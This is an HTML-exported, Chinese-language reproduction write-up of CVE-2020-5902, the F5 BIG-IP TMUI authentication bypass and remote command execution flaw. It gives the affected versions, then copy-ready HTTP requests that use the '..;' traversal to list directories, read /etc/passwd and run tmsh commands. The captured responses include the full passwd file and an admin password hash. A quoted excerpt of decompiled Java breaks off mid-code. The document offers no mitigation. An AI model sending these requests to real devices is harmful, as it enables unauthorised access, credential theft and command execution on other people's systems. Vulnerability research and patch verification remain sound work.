<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-5902f5-big-ip-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-5902</span><span class="csECDA2D3">）</span><span class="csDE05BCC">F5 BIG-IP </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">本次漏洞位于</span><span class="cs8926E06">F5 BIG-IP</span><span class="cs9C1B1871">产品，流量管理用户页面（</span><span class="cs8926E06">TMUI</span><span class="cs9C1B1871">）存在认证绕过漏洞（</span><span class="cs8926E06">CVE-2020-5902</span><span class="cs9C1B1871">），导致可以未授权访问</span><span class="cs8926E06">TMUI</span><span class="cs9C1B1871">模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启</span><span class="cs8926E06">/</span><span class="cs9C1B1871">禁用服务等。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">BIG-IP 15.x: 15.1.0/15.0.0<br/>BIG-IP 14.x: 14.1.0 ~ 14.1.2<br/>BIG-IP 13.x: 13.1.0 ~ 13.1.3<br/>BIG-IP 12.x: 12.1.0 ~ 12.1.5<br/>BIG-IP 11.x: 11.6.1 ~ 11.6.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="列当前文件"><span class="csD6CA00D2">列当前文件</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">/tmui/locallb/workspace/directoryList.jsp</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Example:</span></p><p class="cs3A447A38"><span class="cs9FB05234">directoryPath=/usr/local/www/</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><h4 class="cs868C439D">
			<a name="burpsuite-request"><span class="csBF12A472">BurpSuite Request</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span></p><h4 class="cs868C439D">
			<a name="burpsuite-response"><span class="csBF12A472">BurpSuite Response</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;tmui&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;WEB-INF&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;classes&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;org&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;apache&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;jsp&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;dir&quot;: &quot;common&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;children&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;file&quot;: &quot;deleteconfirm_jsp.class&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;............................</span></p><h3 class="cs868C439D">
			<a name="读取当前文件"><span class="csD6CA00D2">读取当前文件</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Example:</span></p><p class="cs3A447A38"><span class="cs9FB05234">/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><h4 class="cs868C439D">
			<a name="burpsuite-requests"><span class="csBF12A472">BurpSuite Requests</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span></p><h4 class="cs868C439D">
			<a name="burpsuite-response-1"><span class="csBF12A472">BurpSuite Response</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;output&quot;: &quot;root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ntmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin\nadmin:x:0:500:Admin User:/home/admin:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npostgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin\nf5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin\noprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\nhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin\napache:x:48:48:Apache:/usr/local/www:/sbin/nologin\ntomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin\nmysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin\nnamed:x:25:25:Named:/var/named:/bin/false\nqemu:x:107:107:qemu user:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nsdm:x:498:495:sdmuser:/var/sdm:/bin/false\nntp:x:38:38::/etc/ntp:/sbin/nologin\nsyscheck:x:199:10::/:/sbin/nologin\nrestnoded:x:198:198::/:/sbin/nologin\ntwister5:x:0:500:twister5:/home/twister5:/bin/bash\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="format"><span class="csBF12A472">format</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">root:x:0:0:root:/root:/bin/bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bin:x:1:1:bin:/bin:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">operator:x:11:0:operator:/root:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nobody:x:99:99:Nobody:/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">admin:x:0:500:Admin User:/home/admin:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">dbus:x:81:81:System message bus:/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">postgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tcpdump:x:72:72::/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">apache:x:48:48:Apache:/usr/local/www:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">named:x:25:25:Named:/var/named:/bin/false</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">qemu:x:107:107:qemu user:/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sdm:x:498:495:sdmuser:/var/sdm:/bin/false</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ntp:x:38:38::/etc/ntp:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">syscheck:x:199:10::/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">restnoded:x:198:198::/:/sbin/nologin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">twister5:x:0:500:twister5:/home/twister5:/bin/bash</span></p><h3 class="cs868C439D">
			<a name="远程命令执行"><span class="csD6CA00D2">远程命令执行</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Example:</span></p><p class="cs3A447A38"><span class="cs9FB05234">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">list auth user</span><span class="cs8926E06"> look all user</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">list auth user admin</span><span class="cs8926E06"> only look admin user</span></p><p class="cs40DD2BC9"><span class="cs8926E06">https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions<br/>3.png</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;error&quot;: &quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;output&quot;: &quot;auth user admin {\n &nbsp;&nbsp;&nbsp;description \&quot;Admin User\&quot;\n &nbsp;&nbsp;&nbsp;encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1\n &nbsp;&nbsp;&nbsp;partition Common\n &nbsp;&nbsp;&nbsp;partition-access {\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all-partitions {\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;role admin\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n &nbsp;&nbsp;&nbsp;}\n &nbsp;&nbsp;&nbsp;shell tmsh\n}\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="format-1"><span class="csBF12A472">format</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;description &quot;Admin User&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;partition Common</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;partition-access {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all-partitions {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;role admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shell tmsh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="workspaceutilsruntmshcommand"><span class="csBF12A472">WorkspaceUtils.runTmshCommand</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public static JSONObject runTmshCommand(String command, HttpServletRequest request) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JSONObject resultObject = new JSONObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String output = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String error = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!csrfValidated(request.getHeader(&quot;_bufvalue&quot;), request.getHeader(&quot;_timenow&quot;), request.getHeader(&quot;Tmui-Dubbuf&quot;))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logger.warn(&quot;Invalid user token - token provided by user is not authorized&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resultObject.put(&quot;output&quot;, output);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resultObject.put(&quot;error&quot;, NLSEngine.getString(&quot;ilx.workspace.error.InvalidUserToken&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return resultObject;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (&quot;POST&quot;.equalsIgnoreCase(request.getMethod())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] cmdArray = command.split(&quot; &quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String operation = cmdArray[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String module = cmdArray[2];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!ShellCommandValidator.checkForBadShellCharacters(command) &amp;&amp; (operation.equals(&quot;create&quot;) || operation.equals(&quot;delete&quot;) || operation.equals(&quot;list&quot;) || operation.equals(&quot;modify&quot;)) &amp;&amp; WHITELISTED_TMSH_MODULES.contains(module)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] args = { command };</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output = result.getOutput();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error = result.getError();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (com.f5.tmui.util.Syscall.CallException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logger.error(NLSEngine.getString(&quot;ilx.workspace.error.TmshCommandFailed&quot;) + &quot;: &quot; + e.getMessage());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error = e.getMessage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 